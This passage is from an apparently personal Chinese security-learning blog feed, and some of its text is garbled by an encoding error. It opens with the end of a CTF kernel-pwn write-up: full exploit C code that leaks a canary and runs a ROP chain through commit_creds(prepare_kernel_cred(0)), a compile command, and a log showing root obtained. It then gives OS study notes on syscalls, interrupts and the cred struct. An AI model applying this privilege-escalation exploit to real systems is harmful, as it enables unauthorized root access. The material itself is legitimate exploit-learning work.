nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    FILE *ksyms_file;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">size_t</span> offset, canary;<br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    save_status();<br><br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    ksyms_file = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>           <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>           <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    set_off_val(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>        rop_chain[i] = canary;<br>    &#125;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    core_copy(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exploit.c -static -masm=intel -g -o exploit<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘åœ¨kali 2023.3ä¸Šç¼–è¯‘å‡ºæ¥çš„<code>exploit</code>ï¼Œè¿è¡Œçš„æ—¶å€™<code>getuid()</code>ç¡®å®å˜æˆ0äº†ï¼Œä½†æ˜¯ä¸€æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å°±<code>segmentation fault</code>ï¼Œæ¢åˆ°ubuntu20.04å°±å¥½äº†ğŸ˜¶â€ğŸŒ«ï¸</p><p>è¿è¡Œä¹‹åæ–°å¯çš„shell uidä¸º0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ $ <span class="hljs-built_in">id</span><br>uid=1000(chal) gid=1000(chal) <span class="hljs-built_in">groups</span>=1000(chal)<br>/ $ /tmp/exploit <br>[*] Start to exploit...<br>[*] Status has been saved.<br>[+] Successful to get the addr of commit_cread:ffffffffbda9c8e0<br>[+] Successful to get the addr of prepare_kernel_cred:ffffffffbda9cce0<br>[+] Successful to get the root. Execve root shell now...<br>/ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡åškernel pwnï¼Œè¿˜æœ‰å¥½å¤šå¥½å¤šç»†èŠ‚æ²¡å®Œå…¨ç†è§£ğŸ˜­ğŸ˜­ğŸ˜­</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OS</title>
    <link href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/"/>
    <url>/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/</url>
    
    <content type="html"><![CDATA[<h2 id="æ§åˆ¶æµè½¬ç§»"><a href="#æ§åˆ¶æµè½¬ç§»" class="headerlink" title="æ§åˆ¶æµè½¬ç§»"></a>æ§åˆ¶æµè½¬ç§»</h2><h3 id="ç”¨æˆ·æ€åˆ°å†…æ ¸æ€"><a href="#ç”¨æˆ·æ€åˆ°å†…æ ¸æ€" class="headerlink" title="ç”¨æˆ·æ€åˆ°å†…æ ¸æ€"></a>ç”¨æˆ·æ€åˆ°å†…æ ¸æ€</h3><ol><li><p>åˆ‡æ¢GSæ®µå¯„å­˜å™¨</p><p>swapgsæŒ‡ä»¤ï¼ŒæŠŠGSæ®µå¯„å­˜å™¨å’ŒæŸä¸ªç‰¹å®šä½ç½®çš„å€¼è¿›è¡Œäº¤æ¢ï¼Œä¿å­˜GSå€¼ï¼ŒåŒæ—¶äº¤æ¢è¿‡æ¥çš„å€¼ä½œä¸ºå†…æ ¸æ€çš„GS</p></li><li><p>ä¿å­˜ç”¨æˆ·æ ˆå¸§ä¿¡æ¯</p><p>æŠŠç”¨æˆ·æ€æ ˆé¡¶è®°å½•åœ¨<code>CPUç‹¬å å˜é‡åŒºåŸŸé‡Œ</code>ï¼Œå†æŠŠCPUç‹¬å åŒºåŸŸé‡Œè®°å½•å†…æ ¸æ ˆé¡¶æ”¾å…¥rspä¸­</p></li><li><p>ä¿å­˜ç”¨æˆ·æ€å¯„å­˜å™¨ä¿¡æ¯</p><p>æŠŠå¯„å­˜å™¨pushåˆ°æ ˆä¸Šå½¢æˆä¸€ä¸ªpt_regsç»“æ„ä½“</p></li><li><p>é€šè¿‡æ±‡ç¼–æŒ‡ä»¤åˆ¤æ–­æ˜¯å¦ä¸º32ä½ï¼Œå°†æ§åˆ¶æƒäº¤ç»™å†…æ ¸</p></li></ol><p>ä»å†…æ ¸æ€å›åˆ°ç”¨æˆ·æ€æ—¶ï¼Œä¾æ—§ç”¨swapgsæŒ‡ä»¤åˆ‡æ¢GSå¯„å­˜å™¨ï¼Œé€šè¿‡syretqæˆ–iretqæŒ‡ä»¤è®©CPUæ¨¡å¼å›åˆ°ring 3ï¼Œæ¢å¤ç”¨æˆ·æ€çš„çŠ¶æ€</p><h3 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h3><p>CPUåœä¸‹å·¥ä½œï¼Œæ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åºã€‚</p><p>å®æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨ä¸­æ–­å‘é‡è¡¨ï¼ˆinterrupt vector tableï¼‰å­˜æ”¾æ¯ä¸ªä¸­æ–­å·å¯¹åº”çš„å¤„ç†ç¨‹åºã€‚ä¿æŠ¤æ¨¡å¼å¼•å…¥ä¸­æ–­æè¿°ç¬¦è¡¨IDTï¼ˆInterrupt Descriptor Tableï¼‰å­˜æ”¾é—¨æè¿°ç¬¦ï¼ˆgate descriptorï¼‰ï¼Œè€Œè¿™ä¸ªIDTçš„åœ°å€å­˜æ”¾åœ¨IDTRå¯„å­˜å™¨ä¸­ã€‚</p><h4 id="é—¨æ˜¯ä»€ä¹ˆ"><a href="#é—¨æ˜¯ä»€ä¹ˆ" class="headerlink" title="é—¨æ˜¯ä»€ä¹ˆ"></a>é—¨æ˜¯ä»€ä¹ˆ</h4><p>gateä¼šåœ¨ä¸­æ–­å‰è¿›è¡Œæ£€æŸ¥</p><ol><li>ä¸­æ–­é—¨ï¼ˆInterrupt Gateï¼‰å¤„ç†ç¡¬ä¸­æ–­ï¼Œè¿›å…¥ä¸­æ–­é—¨åIFæ ‡å¿—ä½ä¼šè¢«æ¸…é™¤ï¼Œé˜²æ­¢ä¸­æ–­åµŒå¥—ã€‚å¹¶ä¸”ä¸­æ–­é—¨åªèƒ½åœ¨å†…æ ¸æ€ä¸‹è®¿é—®ï¼ˆDescriptor Priviledge Level = 0ï¼‰</li><li>é™·é˜±é—¨ï¼ˆTrap Gateï¼‰å¤„ç†CPUå¼‚å¸¸ï¼Œä½†ä¸ä¼šæ¸…ç©ºIF</li><li>ç³»ç»Ÿé—¨ï¼ˆSystem Gateï¼‰ç³»ç»Ÿè°ƒç”¨ï¼ˆDescriptor Priviledge Level = 3ï¼‰ä¸»è¦ç”¨äºç³»ç»Ÿè°ƒç”¨</li></ol><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/1.jpg"></p><h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h3><blockquote><p>32ä½çš„ç³»ç»Ÿè°ƒç”¨å‚æ•°æ˜¯ebxï¼Œecxï¼Œedxï¼Œesiï¼Œediï¼Œebp</p><p>64ä½è¿˜æ˜¯å’Œæ™®é€šå‡½æ•°ä¸€æ ·</p></blockquote><p>32ä½çš„æ—¶å€™ï¼Œé€šè¿‡int 0x80è§¦å‘ä¸€ä¸ªè½¯ä¸­æ–­è¿›å…¥kernel modeï¼Œä½†æ˜¯åˆ°äº†64ä½çš„æ—¶å€™æœ‰äº†syscallå’ŒsysenteræŒ‡ä»¤ï¼Œå†…æ ¸å¯åŠ¨æ—¶ä¼šå°†ç³»ç»Ÿè°ƒç”¨å‡½æ•°å…¥å£ï¼ˆentry_SYSCALL_64ï¼‰å†™å…¥MSRå¯„å­˜å™¨ç»„ä¸­ï¼Œsycallæ—¶è¿›å…¥ring0å¹¶è·³åˆ°MSRå¯„å­˜å™¨æ‰€æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å…¥å£</p><p>å› æ­¤syscallæ€§èƒ½æ˜¯æ¯”int0x80é«˜çš„</p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/2.jpg"></p><h3 id="ä¿¡å·"><a href="#ä¿¡å·" class="headerlink" title="ä¿¡å·"></a>ä¿¡å·</h3><p>é¦–å…ˆï¼Œä¸€ä¸ªè¿›ç¨‹æ”¶åˆ°ä¿¡å·ï¼Œä¿¡å·ä¼šè¢«å­˜å‚¨åˆ°è¿›ç¨‹æè¿°ç¬¦çš„ä¿¡å·é˜Ÿåˆ—ä¸­</p><p>å½“è¿›ç¨‹è¢«é‡æ–°è°ƒåº¦æ—¶ï¼Œå†…æ ¸æ£€æŸ¥å…¶ä¿¡å·é˜Ÿåˆ—ï¼Œå¤„ç†ä¿¡å·ã€‚å†…æ ¸ä¼šå°†ç”¨æˆ·æ€å¯„å­˜å™¨pushåˆ°ç”¨æˆ·æ€æ ˆä¸Šï¼Œå½¢æˆsigcontextç»“æ„ä½“ï¼Œç„¶åpush SIGNALINFOä»¥åŠæŒ‡å‘sigreturnçš„ä»£ç ã€‚è¿™äº›å†…å®¹æ„æˆäº†<strong>SigreturnFrame</strong>ï¼ˆSROPä¼ªé€ çš„å°±æ˜¯è¿™ä¸ªç»“æ„ä½“ï¼‰</p><p>æ¥ä¸‹æ¥æ§åˆ¶è¢«è¿”å›åˆ°ç”¨æˆ·æ€è¿›ç¨‹ï¼Œè·³è½¬åˆ°å¯¹åº”çš„signal handlerå‡½æ•°ï¼Œå®Œæˆä¹‹åä¼šæ‰§è¡Œsigreturnï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰</p><p>åˆè¿›å…¥äº†å†…æ ¸æ€ï¼Œæ¢å¤åŸæœ‰çš„ç”¨æˆ·æ€ä¸Šä¸‹æ–‡ä¿¡æ¯</p><p>æ§åˆ¶æƒè¿”è¿˜ç”¨æˆ·æ€</p><blockquote><p>è™½ç„¶ä¿¡å·ä¸æ˜¯åŠæ—¶å¤„ç†çš„ï¼Œä½†ç”±äºlinuxè¿›ç¨‹è°ƒåº¦éå¸¸é¢‘ç¹ï¼Œä¿¡å·èƒ½å¾ˆå¿«è¢«å¤„ç†</p></blockquote><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/3.jpg"></p><h2 id="è¿›ç¨‹æƒé™"><a href="#è¿›ç¨‹æƒé™" class="headerlink" title="è¿›ç¨‹æƒé™"></a>è¿›ç¨‹æƒé™</h2><p>åœ¨linux kernelæºç ä¸­ï¼Œ<code>include/linux/sched.h</code>ä¸­å®šä¹‰äº†taskt_structç»“æ„ä½“æ¥æè¿°è¿›ç¨‹ï¼Œç»“æ„ä½“ä¸­ä¸‰ä¸ªProcess credentialsæè¿°äº†è¿›ç¨‹çš„æƒé™</p><ol><li><code>ptracer_cred</code> ä½¿ç”¨ptraceç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªè¯¥è¿›ç¨‹çš„ä¸Šçº§è¿›ç¨‹çš„credï¼ˆgdbçš„åŸç†ï¼‰å¦‚æœæå‰å ç”¨è¿™ä¸ªä½ç½®å°±å¯ä»¥åè°ƒè¯•</li><li><code>real_cred</code> å®¢ä½“å‡­è¯ï¼ˆobjective credï¼‰é€šå¸¸æ˜¯ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶å…·æœ‰çš„æƒé™</li><li><code>cred</code> ä¸»ä½“å‡­è¯ï¼ˆsubjective credï¼‰è¯¥è¿›ç¨‹çš„æœ‰æ•ˆcredï¼Œkernelä»¥æ­¤ä½œä¸ºè¿›ç¨‹æƒé™çš„å‡­è¯</li></ol><p>è¿™ä¸‰ä¸ªéƒ½æ˜¯ä¸€ä¸ªcredç»“æ„ä½“çš„æŒ‡é’ˆï¼Œåœ¨credç»“æ„ä½“ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC    0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD    0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>        uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        suid;        <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        sgid;        <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        euid;        <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        egid;        <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        fsuid;        <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>        fsgid;        <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits;    <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;    <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;    <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;    <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;    <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>    <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>    <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-comment">/* RCU deletion */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">int</span> non_rcu;            <span class="hljs-comment">/* Can we skip RCU deletion? */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span>    <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>    &#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>copyè¿‡æ¥çš„ï¼Œä½†ä¸æ˜¯å¾ˆç†è§£ï¼ˆ</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">ä¸€ä¸ªcredç»“æ„ä½“ä¸­è®°è½½äº†ä¸€ä¸ªè¿›ç¨‹å››ç§ä¸åŒçš„ç”¨æˆ·IDï¼š<br><br>çœŸå®ç”¨æˆ·IDï¼ˆreal <span class="hljs-built_in">UID</span>ï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶çš„ç”¨æˆ·ID<br>ä¿å­˜ç”¨æˆ·IDï¼ˆsaved <span class="hljs-built_in">UID</span>ï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æœ€åˆçš„æœ‰æ•ˆç”¨æˆ·ID<br>æœ‰æ•ˆç”¨æˆ·IDï¼ˆeffective <span class="hljs-built_in">UID</span>ï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ·IDï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ·IDè¿›è¡Œè®¤è¯çš„ï¼Œå†…æ ¸é€šè¿‡ euid æ¥è¿›è¡Œç‰¹æƒåˆ¤æ–­ï¼›ä¸ºäº†é˜²æ­¢ç”¨æˆ·ä¸€ç›´ä½¿ç”¨é«˜æƒé™ï¼Œå½“ä»»åŠ¡å®Œæˆä¹‹åï¼Œeuid ä¼šä¸ suid è¿›è¡Œäº¤æ¢ï¼Œæ¢å¤è¿›ç¨‹çš„æœ‰æ•ˆæƒé™<br>æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·IDï¼ˆ<span class="hljs-built_in">UID</span> <span class="hljs-keyword">for</span> VFS opsï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·ID<br>åœ¨é€šå¸¸æƒ…å†µä¸‹è¿™å‡ ä¸ªIDåº”å½“éƒ½æ˜¯ç›¸åŒçš„<br><br>ç”¨æˆ·ç»„IDåŒæ ·åˆ†ä¸ºå››ä¸ªï¼šçœŸå®ç»„IDã€ä¿å­˜ç»„IDã€æœ‰æ•ˆç»„IDã€æ–‡ä»¶ç³»ç»Ÿç»„ID<br></code></pre></td></tr></table></figure><h3 id="è¿›ç¨‹æƒé™æ”¹å˜"><a href="#è¿›ç¨‹æƒé™æ”¹å˜" class="headerlink" title="è¿›ç¨‹æƒé™æ”¹å˜"></a>è¿›ç¨‹æƒé™æ”¹å˜</h3><p>kernel/cred.cä¸­</p><p><code>cred* prepare_kernel_cred(struct task_struct* daemon)</code>å¯ä»¥æ‹·è´ä¸€ä¸ªè¿›ç¨‹çš„credè¿›ç¨‹çš„ç»“æ„ä½“ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ç»“æ„ä½“</p><p><code>int commit_creds(struct cred *new)</code>å°†ä¸€ä¸ªæ–°çš„credç»“æ„ä½“åº”ç”¨åˆ°è¿›ç¨‹</p><h2 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h2><p>Loadable Kernel Modules</p><p>lsmodæŸ¥çœ‹æ‰€æœ‰çš„LKMs</p><p>insmod/remod è£…è½½/æº¢å‡ºLKM</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¹±ä¸ƒå…«ç³Ÿçš„çŸ¥è¯†</title>
    <link href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="ROMå’ŒRAM"><a href="#ROMå’ŒRAM" class="headerlink" title="ROMå’ŒRAM"></a>ROMå’ŒRAM</h3><p>RAMï¼ˆRandom Access Memoryï¼‰</p><p>ROMï¼ˆRead Only Memoryï¼‰</p><p>åªä¸è¿‡æ˜¯æ—©æœŸROMå› ä¸ºæŠ€æœ¯åŸå› æ˜¯æ— æ³•æ“¦é™¤çš„ï¼Œå‡ºå‚ä¹‹ååªèƒ½è¯»ä¸èƒ½å†™ï¼Œå› æ­¤å«è¿™ä¸ªåå­—ã€‚åæ¥é™¤äº†EPROMå’ŒEEPROMï¼Œå¯ä»¥æ“¦å†™äº†ï¼Œä½†æ˜¯è¿˜æ˜¯ä»ROMæŠ€æœ¯ä¸Šè¡å˜å‡ºæ¥çš„ï¼Œåå­—è¿˜å«ROMã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mit6858 Lab1</title>
    <link href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/"/>
    <url>/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/</url>
    
    <content type="html"><![CDATA[<h2 id="mit-ç³»ç»Ÿå®‰å…¨å®éªŒLab1"><a href="#mit-ç³»ç»Ÿå®‰å…¨å®éªŒLab1" class="headerlink" title="mit ç³»ç»Ÿå®‰å…¨å®éªŒLab1"></a>mit ç³»ç»Ÿå®‰å…¨å®éªŒLab1</h2><p>å‚è€ƒè‡ª<a href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">arttnba3å¤§ä½¬çš„åšå®¢</a>ğŸ¤</p><p>åœ°å€ <a href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html%EF%BC%88Lab1%E7%94%A8%E7%9A%842022%E5%B9%B4%E7%9A%84%E5%AE%9E%E9%AA%8C%EF%BC%89">https://css.csail.mit.edu/6.858/2022/labs/lab1.htmlï¼ˆLab1ç”¨çš„2022å¹´çš„å®éªŒï¼‰</a></p><p>ç»™äº†ä¸€ä¸ªè™šæ‹Ÿæœº<a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">ubuntu 